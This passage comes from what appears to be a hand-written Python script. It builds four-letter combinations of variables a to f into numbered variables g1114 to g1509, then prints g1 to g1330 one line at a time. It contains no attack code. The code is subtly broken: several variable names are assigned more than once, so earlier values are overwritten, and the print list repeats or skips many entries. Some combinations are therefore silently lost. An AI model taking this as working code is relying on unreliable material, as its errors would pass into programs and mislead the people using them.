   g1114 = e+a+f+c
   g1115 = e+a+f+d
   g1116 = e+a+f+e
   g1117 = e+a+f+f
   g1118 = e+b+a+a
   g1119 = e+b+a+b
   g1120 = e+b+a+c
   g1121 = e+b+a+d
   g1122 = e+b+a+e
   g1123 = e+b+a+f
   g1124 = e+b+b+a
   g1125 = e+b+b+b
   g1126 = e+b+b+c
   g1127 = e+b+b+d
   g1128 = e+b+b+e
   g1129 = e+b+b+f
   g1130 = e+b+c+a
   g1131 = e+b+c+b
   g1132 = e+b+c+c
   g1133 = e+b+c+d
   g1134 = e+b+c+e
   g1135 = e+b+c+f
   g1136 = e+b+d+a
   g1137 = e+b+d+b
   g1138 = e+b+d+c
   g1139 = e+b+d+d
   g1140 = e+b+d+e
   g1141 = e+b+d+f
   g1142 = e+b+e+a
   g1143 = e+b+e+b
   g1144 = e+b+e+c
   g1145 = e+b+e+d
   g1146 = e+b+e+e
   g1147 = e+b+e+f
   g1148 = e+b+f+a
   g1149 = e+b+f+b
   g1150 = e+b+f+c
   g1151 = e+b+f+d
   g1152 = e+b+f+e
   g1153 = e+b+f+f
   g1154 = e+c+a+a
   g1155 = e+c+a+b
   g1156 = e+c+a+c
   g1157 = e+c+a+d
   g1158 = e+c+a+e
   g1159 = e+c+a+f
   g1160 = e+c+b+a
   g1161 = e+c+b+b
   g1162 = e+c+b+c
   g1163 = e+c+b+d
   g1164 = e+c+b+e
   g1165 = e+c+b+f
   g1166 = e+c+c+a
   g1167 = e+c+c+b
   g1168 = e+c+c+c
   g1169 = e+c+c+d
   g1170 = e+c+c+e
   g1171 = e+c+c+f
   g1172 = e+c+d+a
   g1173 = e+c+d+b
   g1174 = e+c+d+c
   g1175 = e+c+d+d
   g1176 = e+c+d+e
   g1177 = e+c+d+f
   g1178 = e+c+e+a
   g1179 = e+c+e+b
   g1180 = e+c+e+c
   g1181 = e+c+e+d
   g1182 = e+c+e+e
   g1183 = e+c+e+f
   g1184 = e+c+f+a
   g1185 = e+c+f+b
   g1186 = e+c+f+c
   g1187 = e+c+f+d
   g1188 = e+c+f+e
   g1189 = e+c+f+f
   g1190 = e+d+a+a
   g1191 = e+d+a+b
   g1192 = e+d+a+c
   g1193 = e+d+a+d
   g1194 = e+d+a+e
   g1195 = e+d+a+f
   g1196 = e+d+b+a
   g1197 = e+d+b+b
   g1198 = e+d+b+c
   g1199 = e+d+b+d
   g1200 = e+d+b+e
   g1201 = e+d+b+f
   g1202 = e+d+c+a
   g1203 = e+d+c+b
   g1204 = e+d+c+c
   g1205 = e+d+c+d
   g1206 = e+d+c+e
   g1207 = e+d+c+f
   g1208 = e+d+d+a
   g1209 = e+d+d+b
   g1210 = e+d+d+c
   g1211 = e+d+d+d
   g1212 = e+d+d+e
   g1213 = e+d+d+f
   g1214 = e+d+e+a
   g1215 = e+d+e+b
   g1216 = e+d+e+c
   g1217 = e+d+e+d
   g1218 = e+d+e+e
   g1219 = e+d+e+f
   g1220 = e+d+f+a
   g1221 = e+d+f+b
   g1222 = e+d+f+c
   g1223 = e+d+f+d
   g1224 = e+d+f+e
   g1225 = e+d+f+f
   g1226 = e+e+a+a
   g1227 = e+e+a+b
   g1228 = e+e+a+c
   g1229 = e+e+a+d
   g1230 = e+e+a+e
   g1231 = e+e+a+f
   g1232 = e+e+b+a
   g1233 = e+e+b+b
   g1234 = e+e+b+c
   g1235 = e+e+b+d
   g1236 = e+e+b+e
   g1237 = e+e+b+f
   g1238 = e+e+c+a
   g1239 = e+e+c+b
   g1240 = e+e+c+c
   g1241 = e+e+c+d
   g1242 = e+e+c+e
   g1243 = e+e+c+f
   g1244 = e+e+d+a
   g1245 = e+e+d+b
   g1246 = e+e+d+c
   g1247 = e+e+d+d
   g1248 = e+e+d+e
   g1249 = e+e+d+f
   g1250 = e+e+e+a
   g1251 = e+e+e+b
   g1252 = e+e+e+c
   g1253 = e+e+e+d
   g1254 = e+e+e+e
   g1255 = e+e+e+f
   g1256 = e+e+f+a
   g1257 = e+e+f+b
   g1258 = e+e+f+c
   g1259 = e+e+f+d
   g1260 = e+e+f+e
   g1261 = e+e+f+f
   g1262 = e+f+a+a         #this is cool name :)
   g1263 = e+f+a+b
   g1264 = e+f+a+c
   g1265 = e+f+a+d
   g1266 = e+f+a+e
   g1267 = e+f+a+f
   g1268 = e+f+b+a
   g1269 = e+f+b+b
   g1270 = e+f+b+c
   g1271 = e+f+b+d
   g1272 = e+f+b+e
   g1273 = e+f+b+f
   g1274 = e+f+c+a
   g1275 = e+f+c+b
   g1276 = e+f+c+c
   g1277 = e+f+c+d
   g1278 = e+f+c+e
   g1279 = e+f+c+f
   g1280 = e+f+d+a
   g1281 = e+f+d+b
   g1282 = e+f+d+c
   g1283 = e+f+d+d
   g1284 = e+f+d+e
   g1285 = e+f+d+f
   g1286 = e+f+e+a
   g1287 = e+f+e+b
   g1288 = e+f+e+c
   g1289 = e+f+e+d
   g1290 = e+f+e+e
   g1291 = e+f+e+f
   g1292 = e+f+f+a
   g1293 = e+f+f+b
   g1294 = e+f+f+c
   g1295 = e+f+f+d
   g1296 = e+f+f+e
   g1297 = e+f+f+f
   g1298 = f+a+a+a
   g1299 = f+a+a+b
   g1300 = f+a+a+c
   g1301 = f+a+a+d
   g1302 = f+a+a+e
   g1303 = f+a+a+f
   g1304 = f+a+b+a
   g1305 = f+a+b+b
   g1306 = f+a+b+c
   g1307 = f+a+b+d
   g1308 = f+a+b+e
   g1309 = f+a+b+f
   g1310 = f+a+c+a
   g1311 = f+a+c+b
   g1312 = f+a+c+c
   g1313 = f+a+c+d
   g1314 = f+a+c+e
   g1315 = f+a+c+f
   g1316 = f+a+d+a
   g1317 = f+a+d+b
   g1318 = f+a+d+c
   g1319 = f+a+d+d
   g1320 = f+a+d+e
   g1321 = f+a+d+f
   g1322 = f+a+e+a
   g1323 = f+a+e+b
   g1324 = f+a+e+c
   g1325 = f+a+e+d
   g1326 = f+a+e+e
   g1327 = f+a+e+f
   g1328 = f+a+f+a
   g1329 = f+a+f+b
   g1330 = f+a+f+c
   g1331 = f+a+f+d
   g1332 = f+a+f+e
   g1333 = f+a+f+f
   g1334 = f+b+a+a
   g1335 = f+b+a+b
   g1336 = f+b+a+c
   g1337 = f+b+a+d
   g1337 = f+b+a+e
   g1337 = f+b+a+f
   g1338 = f+b+b+a
   g1339 = f+b+b+b
   g1340 = f+b+b+c
   g1341 = f+b+b+d
   g1342 = f+b+b+e
   g1343 = f+b+b+f
   g1344 = f+b+c+a
   g1345 = f+b+c+b
   g1346 = f+b+c+c
   g1347 = f+b+c+d
   g1348 = f+b+c+e
   g1349 = f+b+c+f
   g1350 = f+b+d+a
   g1351 = f+b+d+b
   g1352 = f+b+d+c
   g1353 = f+b+d+d
   g1354 = f+b+d+e
   g1355 = f+b+d+f
   g1356 = f+b+e+a
   g1357 = f+b+e+b
   g1358 = f+b+e+c
   g1359 = f+b+e+d
   g1360 = f+b+e+e
   g1361 = f+b+e+f
   g1362 = f+b+f+a
   g1363 = f+b+f+b
   g1364 = f+b+f+c
   g1365 = f+b+f+d
   g1366 = f+b+f+e
   g1367 = f+b+f+f
   g1368 = f+c+a+a
   g1369 = f+c+a+b
   g1370 = f+c+a+c
   g1371 = f+c+a+d
   g1372 = f+c+a+e
   g1373 = f+c+a+f
   g1374 = f+c+b+a
   g1375 = f+c+b+b
   g1376 = f+c+b+c
   g1377 = f+c+b+d
   g1378 = f+c+b+e
   g1379 = f+c+b+f
   g1380 = f+c+c+a
   g1381 = f+c+c+b
   g1382 = f+c+c+c
   g1383 = f+c+c+d
   g1384 = f+c+c+e
   g1385 = f+c+c+f
   g1386 = f+c+d+a
   g1387 = f+c+d+b
   g1388 = f+c+d+c
   g1389 = f+c+d+d
   g1390 = f+c+d+e
   g1391 = f+c+d+f
   g1392 = f+c+e+a
   g1393 = f+c+e+b
   g1394 = f+c+e+c
   g1395 = f+c+e+d
   g1396 = f+c+e+e
   g1397 = f+c+e+f
   g1398 = f+c+f+a
   g1399 = f+c+f+b
   g1400 = f+c+f+c
   g1401 = f+c+f+d
   g1402 = f+c+f+e
   g1403 = f+c+f+f
   g1404 = f+d+a+a
   g1405 = f+d+a+b
   g1406 = f+d+a+c
   g1407 = f+d+a+d
   g1408 = f+d+a+e
   g1409 = f+d+a+f
   g1410 = f+d+b+a
   g1411 = f+d+b+b
   g1412 = f+d+b+c
   g1413 = f+d+b+d
   g1414 = f+d+b+e
   g1415 = f+d+b+f
   g1416 = f+d+c+a
   g1417 = f+d+c+b
   g1418 = f+d+c+c
   g1419 = f+d+c+d
   g1420 = f+d+c+e
   g1421 = f+d+c+f
   g1422 = f+d+d+a
   g1423 = f+d+d+b
   g1424 = f+d+d+c
   g1425 = f+d+d+d
   g1426 = f+d+d+e
   g1427 = f+d+d+f
   g1428 = f+d+e+a
   g1429 = f+d+e+b
   g1430 = f+d+e+c
   g1431 = f+d+e+d
   g1432 = f+d+e+e
   g1433 = f+d+e+f
   g1434 = f+d+f+a
   g1435 = f+d+f+b
   g1436 = f+d+f+c
   g1437 = f+d+f+d
   g1438 = f+d+f+e
   g1439 = f+d+f+f
   g1440 = f+e+a+a
   g1441 = f+e+a+b
   g1442 = f+e+a+c
   g1443 = f+e+a+d
   g1444 = f+e+a+e
   g1445 = f+e+a+f
   g1445 = f+e+b+a
   g1446 = f+e+b+b
   g1447 = f+e+b+c
   g1448 = f+e+b+d
   g1449 = f+e+b+e
   g1450 = f+e+b+f
   g1451 = f+e+c+a
   g1452 = f+e+c+b
   g1453 = f+e+c+c
   g1454 = f+e+c+d
   g1455 = f+e+c+e
   g1456 = f+e+c+f
   g1457 = f+e+d+a
   g1458 = f+e+d+b
   g1459 = f+e+d+c
   g1460 = f+e+d+d
   g1461 = f+e+d+e
   g1462 = f+e+d+f
   g1463 = f+e+e+a
   g1464 = f+e+e+b
   g1465 = f+e+e+c
   g1466 = f+e+e+d
   g1467 = f+e+e+e
   g1468 = f+e+e+f
   g1469 = f+e+f+a
   g1470 = f+e+f+b
   g1471 = f+e+f+c
   g1472 = f+e+f+d
   g1473 = f+e+f+e
   g1474 = f+e+f+f
   g1475 = f+f+a+a
   g1476 = f+f+a+b
   g1477 = f+f+a+c
   g1478 = f+f+a+d
   g1479 = f+f+a+e
   g1480 = f+f+a+f
   g1481 = f+f+b+a
   g1481 = f+f+b+b
   g1482 = f+f+b+c
   g1483 = f+f+b+d
   g1484 = f+f+b+e
   g1485 = f+f+b+f
   g1486 = f+f+c+a
   g1487 = f+f+c+b
   g1488 = f+f+c+c
   g1489 = f+f+c+d
   g1490 = f+f+c+e
   g1491 = f+f+c+f
   g1492 = f+f+d+a
   g1493 = f+f+d+b
   g1494 = f+f+d+c
   g1495 = f+f+d+d
   g1496 = f+f+d+e
   g1497 = f+f+d+f
   g1498 = f+f+e+a
   g1499 = f+f+e+b
   g1500 = f+f+e+c
   g1501 = f+f+e+d
   g1502 = f+f+e+e
   g1503 = f+f+e+f
   g1504 = f+f+f+a
   g1505 = f+f+f+b
   g1506 = f+f+f+c
   g1507 = f+f+f+d
   g1508 = f+f+f+e
   g1509 = f+f+f+f
   print("_________________")
   '''#######################################################################'''
   print(g1)
   print(g2)
   print(g3)
   print(g4)
   print(g5)
   print(g6)
   print(g7)
   print(g8)
   print(g9)
   print(g10)  
   print(g11)
   print(g12)
   print(g13)
   print(g14)
   print(g15)
   print(g16)
   print(g17)
   print(g18)
   print(g19)
   print(g20)
   print(g21)
   print(g22)
   print(g23)
   print(g24)
   print(g25)
   print(g26)
   print(g27)
   print(g28)
   print(g29)
   print(g30)
   print(g31)
   print(g23)
   print(g33)
   print(g34)
   print(g35)
   print(g36)
   print(g37)
   print(g38)
   print(g39)
   print(g40)
   print(g41)
   print(g42)
   print(g43)
   print(g44)
   print(g45)
   print(g46)
   print(g47)
   print(g48)
   print(g49)
   print(g50)
   print(g51)
   print(g52)
   print(g53)
   print(g54)
   print(g55)
   print(g56)
   print(g57)
   print(g59)
   print(g59)
   print(g60)
   print(g61)
   print(g62)
   print(g63)
   print(g64)
   print(g65)
   print(g66)
   print(g67)
   print(g68)
   print(g69)
   print(g70)
   print(g71)
   print(g72)
   print(g73)
   print(g74)
   print(g75)
   print(g76)
   print(g77)
   print(g78)
   print(g79)
   print(g80)
   print(g81)
   print(g82)
   print(g83)
   print(g84)
   print(g85)
   print(g86)
   print(g87)
   print(g88)
   print(g89)
   print(g90)
   print(g92)
   print(g93)
   print(g94)
   print(g95)
   print(g96)
   print(g97)
   print(g98)
   print(g99)
   print(g100)
   print(g101)
   print(g102)
   print(g103)
   print(g104)
   print(g105)
   print(g106)
   print(g107)
   print(g108)
   print(g109)
   print(g110)
   print(g111)
   print(g112)
   print(g113)
   print(g114)
   print(g115)
   print(g116)
   print(g117)
   print(g118)
   print(g119)
   print(g120)
   print(g121)
   print(g122)
   print(g123)
   print(g124)
   print(g125)
   print(g126)
   print(g127)
   print(g128)
   print(g129)
   print(g130)
   print(g131)
   print(g132)
   print(g133)
   print(g135)
   print(g136)
   print(g137)
   print(g138)
   print(g139)
   print(g140)
   print(g141)
   print(g142)
   print(g143)
   print(g144)
   print(g145)
   print(g146)
   print(g147)
   print(g148)
   print(g149)
   print(g150)
   print(g151)
   print(g152)
   print(g153)
   print(g154)
   print(g155)
   print(g156)
   print(g157)
   print(g158)
   print(g159)
   print(g160)
   print(g161)
   print(g162)
   print(g163)
   print(g164)
   print(g165)
   print(g166)
   print(g167)
   print(g168)
   print(g169)
   print(g170)
   print(g171)
   print(g172)
   print(g173)
   print(g174)
   print(g175)
   print(g176)
   print(g177)
   print(g178)
   print(g179)
   print(g180)
   print(g181)
   print(g182)
   print(g183)
   print(g184)
   print(g185)
   print(g186)
   print(g187)
   #print(g188)
   print(g189)
   print(g190)
   print(g191)
   print(g192)
   print(g193)
   print(g194)
   print(g195)
   print(g196)
   print(g197)
   print(g198)
   print(g199)
   print(g200)
   print(g201)
   print(g202)
   print(g203)
   print(g204)
   print(g205)
   print(g206)
   print(g207)
   print(g208)
   print(g209)
   print(g210)
   print(g211)
   print(g212)
   print(g213)
   print(g214)	
   print(g215)
   print(g216)
   print(g219)
   print(g220)	
   print(g221)
   print(g222)
   print(g223)
   print(g224)
   print(g225)
   print(g226)
   print(g227)
   print(g228)
   print(g229)
   print(g230)
   print(g231)
   print(g232)
   print(g233)
   print(g234)
   print(g235)
   print(g236)
   print(g237)
   print(g238)
   print(g239)	
   print(g240)
   print(g241)
   print(g242)
   print(g243)
   print(g244)
   print(g245)
   print(g246)
   print(g247)
   print(g248)
   print(g249)
   print(g250)
   print(g251)
   print(g252)
   print(g253)
   print(g254)
   print(g255)
   print(g256)
   print(g257)
   print(g258)
   print(g259)
   print(g260)
   print(g261)
   print(g262)
   print(g263)
   print(g264)
   print(g265)
   print(g266)
   print(g267)
   print(g268)
   print(g269)
   print(g270)
   print(g271)
   print(g272)
   print(g273)
   print(g274)
   print(g275)
   print(g276)
   print(g277)
   print(g278)
   print(g279)
   print(g280)
   print(g281)
   print(g282)
   print(g283)
   print(g284)
   print(g285)
   print(g286)
   print(g287)
   print(g288)
   print(g289)
   print(g290)
   print(g291)
   print(g292)
   print(g293)
   print(g294)
   print(g295)
   print(g296)
   print(g297)
   print(g298)
   print(g299)
   print(g300)
   print(g301)
   print(g302)
   print(g303)
   print(g304)
   print(g305)
   print(g306)
   print(g307)
   print(g308)
   print(g309)
   print(g310)
   print(g311)
   print(g312)
   print(g313)
   print(g314)
   print(g315)
   print(g316)
   print(g317)
   print(g318)
   print(g319)
   print(g320)
   print(g321)
   print(g322)
   print(g323)
   print(g324)
   print(g325)
   print(g326)
   print(g327)
   print(g328)
   print(g329)
   print(g330)
   print(g331)
   print(g332)
   print(g333)
   print(g334)
   print(g335)
   print(g336)
   print(g337)
   print(g338)
   print(g339)
   print(g340)
   print(g341)
   print(g342)
   print(g343)
   print(g344)
   print(g345)
   print(g346)
   print(g347)
   print(g348)
   print(g349)
   print(g350)
   print(g351)
   print(g352)
   print(g353)
   print(g354)
   print(g355)
   print(g356)
   print(g357)
   print(g358)
   print(g359)
   print(g360)
   print(g361)
   print(g362)
   print(g363)
   print(g364)
   print(g365)
   print(g366)
   print(g367)
   print(g368)
   print(g369)
   print(g370)
   print(g371)
   print(g372)
   print(g373)
   print(g374)
   print(g375)
   print(g376)
   print(g377)
   print(g378)
   print(g379)
   print(g380)
   print(g381)
   print(g382)
   print(g383)
   print(g384)
   print(g385)
   print(g386)
   print(g387)
   print(g388)
   print(g389)
   print(g390)
   print(g391)
   print(g392)
   print(g393)
   print(g394)
   print(g395)
   print(g396)
   print(g397)
   print(g398)
   print(g399)
   print(g400)
   print(g401)
   print(g402)
   print(g403)
   print(g404)
   print(g405)
   print(g406)
   print(g407)
   print(g408)
   print(g409)
   print(g410)
   print(g411)
   print(g412)
   print(g413)
   print(g414)
   print(g415)
   print(g416)
   print(g417)
   print(g418)
   print(g419)
   print(g420)
   print(g421)
   print(g422)
   print(g423)
   print(g424)
   print(g425)
   print(g426)
   print(g427)
   print(g428)
   print(g429)
   print(g430)
   print(g431)
   print(g432)
   print(g433)
   print(g434)
   print(g435)
   print(g436)
   print(g437)
   print(g438)
   print(g439)
   print(g440)
   print(g441)
   print(g442)
   print(g443)
   print(g444)
   print(g445)
   print(g446)
   print(g447)
   print(g448)
   print(g449)
   #print(g450)
   #print(g451)
   #print(g452)
   #print(g453)
   #print(g454)
   #print(g455)
   #print(g456)
   #print(g457)
   #print(g458)
   #print(g459)
   #print(g460)
   #print(g461)
   #print(g462)
   #print(g463)
   #print(g464)
   #print(g465)
   #print(g466)
   #print(g467)
   #print(g468)
   #print(g469)
   #print(g470)
   #print(g471)
   #print(g472)
   #print(g473)
   #print(g474)
   #print(g475)
   #print(g476)
   #print(g477)
   #print(g478)
   #print(g479)
   #print(g480)
   #print(g481)
   #print(g482)
   #print(g483)
   #print(g484)
   #print(g485)
   #print(g486)
   #print(g487)
   #print(g489)
   #print(g490)
   #print(g491)
   #print(g492)
   #print(g493)
   #print(g494)
   #print(g495)
   #print(g496)
   #print(g497)
   #print(g498)
   #print(g499)
   print(g500)
   print(g501)
   print(g501)
   print(g503)
   print(g504)
   print(g505)
   print(g506)
   print(g507)
   print(g508)
   print(g509)
   print(g510)
   print(g511)
   print(g512)
   print(g513)
   print(g514)
   print(g515)
   print(g516)
   print(g517)
   print(g518)
   print(g519)
   print(g520)
   print(g521)
   print(g522)
   print(g523)
   print(g524)
   print(g525)
   print(g526)
   print(g527)
   print(g528)
   print(g529)
   print(g530)
   print(g531)
   print(g532)
   print(g533)
   print(g534)
   print(g535)
   print(g536)
   print(g537)
   print(g538)
   print(g539)
   print(g540)
   print(g541)
   print(g542)
   print(g543)
   print(g544)
   print(g545)
   print(g546)
   print(g547)
   print(g548)
   print(g549)
   print(g550)
   print(g551)
   print(g552)
   print(g553)
   print(g554)
   print(g555)
   print(g556)
   print(g557)
   print(g558)
   print(g559)
   print(g560)
   print(g561)
   print(g562)
   print(g563)
   print(g564)
   print(g567)
   print(g568)
   print(g569)
   print(g570)
   print(g571)
   print(g572)
   print(g573)
   print(g574)
   print(g575)
   print(g576)
   print(g577)
   print(g578)
   print(g579)
   print(g580)
   print(g581)
   print(g582)
   print(g583)
   print(g584)
   print(g585)
   print(g586)
   print(g587)
   print(g588)
   print(g589)
   print(g590)
   print(g591)
   print(g592)
   print(g593)
   print(g594)
   print(g595)
   print(g596)
   print(g597)
   print(g598)
   print(g599)
   print(g600)
   print(g601)
   print(g602)
   print(g603)
   print(g604)
   print(g605)
   print(g606)
   print(g607)
   print(g608)
   print(g609)
   print(g610)
   print(g611)
   print(g612)
   print(g613)
   print(g614)
   print(g615)
   print(g616)
   print(g617)
   print(g618)
   print(g619)
   print(g620)
   print(g621)
   print(g622)
   print(g623)
   print(g624)
   print(g625)
   print(g626)
   print(g627)
   print(g628)
   print(g629)
   print(g630)
   print(g631)
   print(g632)
   print(g633)
   print(g634)
   print(g635)
   print(g636)
   print(g637)
   print(g638)
   print(g638)
   print(g640)
   print(g641)
   print(g642)
   print(g643)
   print(g644)
   print(g645)
   print(g647)
   print(g648)
   print(g649)
   print(g650)
   print(g651)
   print(g652)
   print(g653)
   print(g653)
   print(g654)
   print(g655)
   print(g666)
   print(g667)
   print(g668)
   print(g669)
   print(g670)
   print(g671)
   print(g672)
   print(g673)
   print(g674)
   print(g675)
   print(g676)
   print(g677)
   print(g678)
   print(g679)
   print(g680)
   print(g681)
   print(g682)
   print(g683)
   print(g684)
   print(g685)
   print(g686)
   print(g687)
   print(g688)
   print(g689)
   print(g690)
   print(g691)
   print(g692)
   print(g693)
   print(g694)
   print(g695)
   print(g696)
   print(g697)
   print(g698)
   print(g699)
   print(g700)
   print(g701)
   print(g702)
   print(g703)
   print(g704)
   print(g705)
   print(g706)
   print(g707)
   print(g708)
   print(g709)
   print(g710)
   print(g711)
   print(g712)
   print(g713)
   print(g714)
   print(g715)
   print(g716)
   print(g719)
   print(g720)
   print(g721)
   print(g722)
   print(g723)
   print(g724)
   print(g725)
   print(g726)
   print(g727)
   print(g728)
   print(g729)
   print(g730)
   print(g731)
   print(g732)
   print(g733)
   print(g734)
   print(g735)
   print(g736)
   print(g737)
   print(g738)
   print(g739)
   print(g740)
   print(g741)
   print(g742)
   print(g743)
   print(g744)
   print(g745)
   print(g746)
   print(g747)
   print(g748)
   print(g749)
   print(g780)
   print(g781)
   print(g782)
   print(g783)
   print(g784)
   print(g785)
   print(g786)
   print(g787)
   print(g788)
   print(g789)
   print(g790)
   print(g791)
   print(g792)
   print(g793)
   print(g794)
   print(g795)
   print(g796)
   print(g797)
   print(g798)
   print(g799)
   print(g800)
   print(g801)
   print(g802)
   print(g803)
   print(g804)
   print(g805)
   print(g806)
   print(g807)
   print(g808)
   print(g809)
   print(g810)
   print(g811)
   print(g812)
   print(g813)
   print(g814)
   print(g815)
   print(g816)
   print(g817)
   print(g819)
   print(g820)
   print(g821)
   print(g822)
   print(g823)
   print(g824)
   print(g825)
   print(g826)
   print(g827)
   print(g828)
   print(g829)
   print(g830)
   print(g831)
   print(g832)
   print(g833)
   print(g834)
   print(g835)
   print(g836)
   print(g837)
   print(g838)
   print(g839)
   print(g840)
   print(g841)
   print(g842)
   print(g843)
   print(g844)
   print(g845)
   print(g846)
   print(g847)
   print(g848)
   print(g848)
   print(g849)
   print(g850)
   print(g851)
   print(g852)
   print(g853)
   print(g854)
   print(g855)
   print(g856)
   print(g857)
   print(g858)
   print(g859)
   print(g860)
   print(g861)
   print(g862)
   print(g863)
   print(g864)
   print(g864)
   print(g865)
   print(g866)
   print(g867)
   print(g868)
   print(g869)
   print(g870)
   print(g871)
   print(g872)
   print(g873)
   print(g874)
   #print(g875)
   #print(g876)
   #print(g877)
   #print(g878)
   #print(g879)
   #print(g880)
   #print(g881)
   #print(g882)
   #print(g883)
   #print(g884)
   print(g885)
   print(g886)
   print(g887)
   print(g888)
   print(g889)
   print(g890)
   print(g891)
   print(g892)
   print(g893)
   print(g894)
   print(g895)
   print(g896)
   print(g897)
   print(g899)
   print(g900)
   print(g901)
   print(g902)
   print(g903)
   print(g904)
   print(g905)
   print(g906)
   print(g907)
   print(g908)
   print(g909)
   print(g910)
   print(g911)
   print(g912)
   print(g913)
   print(g914)
   print(g915)
   print(g916)
   print(g917)
   print(g918)
   print(g919)
   print(g920)
   print(g921)
   print(g922)
   print(g923)
   print(g924)
   print(g925)
   print(g926)
   print(g927)
   print(g928)
   print(g929)
   print(g930)
   print(g931)
   print(g932)
   print(g933)
   print(g934)
   print(g935)
   print(g936)
   print(g937)
   print(g938)
   print(g939)
   print(g940)
   print(g941)
   print(g942)
   print(g943)
   print(g944)
   print(g945)
   print(g946)
   print(g947)
   print(g948)
   print(g949)
   print(g950)
   print(g951)
   print(g952)
   print(g953)
   print(g954)
   print(g955)
   print(g956)
   print(g957)
   print(g958)
   print(g959)
   print(g960)
   print(g961)
   print(g962)
   print(g963)
   print(g963)
   print(g964)
   print(g965)
   print(g966)
   print(g967)
   print(g968)
   print(g969)
   print(g970)
   print(g971)
   print(g972)
   print(g973)
   print(g974)
   print(g975)
   print(g976)
   print(g977)
   print(g978)
   print(g979)
   print(g980)
   print(g981)
   print(g982)
   print(g983)
   print(g984)
   print(g985)
   print(g986)
   print(g987)
   print(g988)
   print(g989)
   print(g990)
   print(g991)
   print(g992)
   print(g993)
   print(g994)
   print(g995)
   print(g996)
   print(g997)
   print(g998)
   print(g999)
   print(g1000)
   print(g1001)
   print(g1002)
   print(g1003)
   print(g1004)
   print(g1005)
   print(g1006)
   print(g1007)
   print(g1008)
   print(g1009)
   print(g1010)
   print(g1011)
   print(g1012)
   print(g1013)
   print(g1014)
   print(g1015)
   print(g1016)
   print(g1017)
   print(g1018)
   print(g1019)
   print(g1020)
   print(g1021)
   print(g1022)
   print(g1023)
   print(g1024)
   print(g1025)
   print(g1026)
   print(g1027)
   print(g1028)
   print(g1029)
   print(g1030)
   print(g1031)
   print(g1032)
   print(g1033)
   print(g1034)
   print(g1035)
   print(g1036)
   print(g1037)
   print(g1038)
   print(g1039)
   print(g1040)
   print(g1041)
   print(g1042)
   print(g1043)
   print(g1044)
   print(g1045)
   print(g1046)
   print(g1047)
   print(g1048)
   print(g1049)
   print(g1050)
   print(g1051)
   print(g1052)
   print(g1053)
   print(g1054)
   print(g1055)
   print(g1056)
   print(g1057)
   print(g1058)
   print(g1059)
   print(g1060)
   print(g1061)
   print(g1062)
   print(g1063)
   print(g1064)
   print(g1065)
   #print(g1066)
   print(g1067)
   print(g1068)
   print(g1069)
   print(g1070)
   print(g1071)
   print(g1072)
   print(g1073)
   print(g1074)
   print(g1075)
   print(g1076)
   print(g1077)
   print(g1078)
   print(g1079)
   print(g1080)
   print(g1081)
   print(g1082)
   print(g1083)
   print(g1084)
   print(g1085)
   print(g1086)
   print(g1087)
   print(g1088)
   print(g1089)
   print(g1090)
   print(g1091)
   print(g1092)
   print(g1093)
   print(g1094)
   print(g1095)
   print(g1096)
   print(g1097)
   print(g1098)
   print(g1099)
   print(g1100)
   print(g1101)
   print(g1102)
   print(g1103)
   print(g1104)
   print(g1105)
   print(g1106)
   print(g1107)
   print(g1108)
   print(g1109)
   print(g1110)
   print(g1111)
   print(g1112)
   print(g1113)
   print(g1114)
   print(g1115)
   print(g1116)
   print(g1117)
   print(g1118)
   print(g1119)
   print(g1120)
   print(g1121)
   print(g1122)
   print(g1123)
   print(g1124)
   print(g1125)
   print(g1126)
   print(g1127)
   print(g1128)
   print(g1129)
   print(g1130)
   print(g1131)
   print(g1132)
   print(g1133)
   print(g1134)
   print(g1135)
   print(g1136)
   print(g1137)
   print(g1138)
   print(g1139)
   print(g1140)
   print(g1141)
   print(g1142)
   print(g1143)
   print(g1144)
   print(g1145)
   print(g1146)
   print(g1147)
   print(g1148)
   print(g1149)
   print(g1150)
   print(g1151)
   print(g1152)
   print(g1153)
   print(g1154)
   print(g1155)
   print(g1156)
   print(g1157)
   print(g1158)
   print(g1159)
   print(g1160)
   print(g1161)
   print(g1162)
   print(g1163)
   print(g1164)
   print(g1165)
   print(g1166)
   print(g1167)
   print(g1168)
   print(g1169)
   print(g1170)
   print(g1171)
   print(g1172)
   print(g1173)
   print(g1174)
   print(g1175)
   print(g1176)
   print(g1177)
   print(g1178)
   print(g1179)
   print(g1180)
   print(g1181)
   print(g1182)
   print(g1183)
   print(g1184)
   print(g1185)
   print(g1186)
   print(g1187)
   print(g1188)
   print(g1189)
   print(g1190)
   print(g1191)
   print(g1192)
   print(g1193)
   print(g1194)
   print(g1195)
   print(g1196)
   print(g1197)
   print(g1198)
   print(g1199)
   print(g1200)
   print(g1201)
   print(g1202)
   print(g1203)
   print(g1204)
   print(g1205)
   print(g1206)
   print(g1207)
   print(g1208)
   print(g1209)
   print(g1210)
   print(g1211)
   print(g1212)
   print(g1213)
   print(g1214)
   print(g1215)
   print(g1216)
   print(g1217)
   print(g1218)
   print(g1219)
   print(g1220)
   print(g1221)
   print(g1222)
   print(g1223)
   print(g1224)
   print(g1225)
   print(g1226)
   print(g1227)
   print(g1228)
   print(g1229)
   print(g1230)
   print(g1231)
   print(g1232)
   print(g1233)
   print(g1234)
   print(g1235)
   print(g1236)
   print(g1237)
   print(g1238)
   print(g1239)
   print(g1240)
   print(g1241)
   print(g1242)
   print(g1243)
   print(g1244)
   print(g1245)
   print(g1246)
   print(g1247)
   print(g1248)
   print(g1249)
   print(g1250)
   print(g1251)
   print(g1252)
   print(g1253)
   print(g1254)
   print(g1255)
   print(g1256)
   print(g1257)
   print(g1258)
   print(g1259)
   print(g1260)
   print(g1261)
   print(g1262)
   print(g1263)
   print(g1264)
   print(g1265)
   print(g1266)
   print(g1267)
   print(g1268)
   print(g1269)
   print(g1270)
   print(g1271)
   print(g1272)
   print(g1273)
   print(g1274)
   print(g1275)
   print(g1276)
   print(g1277)
   print(g1278)
   print(g1279)
   print(g1280)
   print(g1281)
   print(g1282)
   print(g1283)
   print(g1284)
   print(g1285)
   print(g1286)
   print(g1287)
   print(g1288)
   print(g1289)
   print(g1290)
   print(g1291)
   print(g1292)
   print(g1293)
   print(g1294)
   print(g1295)
   print(g1296)
   print(g1297)
   print(g1298)
   print(g1299)
   print(g1300)
   print(g1301)
   print(g1302)
   print(g1303)
   print(g1304)
   print(g1305)
   print(g1306)
   print(g1307)
   print(g1308)
   print(g1309)
   print(g1310)
   print(g1311)
   print(g1312)
   print(g1313)
   print(g1314)
   print(g1315)
   print(g1316)
   print(g1317)
   print(g1318)
   print(g1319)
   print(g1320)
   print(g1321)
   print(g1322)
   print(g1323)
   print(g1324)
   print(g1325)
   print(g1326)
   print(g1327)
   print(g1328)
   print(g1329)
   print(g1330)
